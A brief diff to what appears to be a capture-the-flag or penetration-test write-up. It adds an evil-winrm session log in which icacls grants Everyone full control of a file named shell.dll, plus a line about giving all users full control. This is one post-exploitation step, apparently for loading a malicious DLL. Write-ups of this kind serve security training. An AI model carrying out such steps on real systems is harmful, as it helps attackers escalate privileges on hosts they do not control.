@@ -537,8 +537,13 @@ evil-winrm-py PS C:\Temp>
 Ill use my evil-winrm session to make the upload simpler
 
 ```python
-
+evil-winrm-py PS C:\Temp> icacls "shell.dll" /grant Everyone:F
+processed file: shell.dll
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\Temp>
 ```
+
+Then ill give all users full control
 
 
 
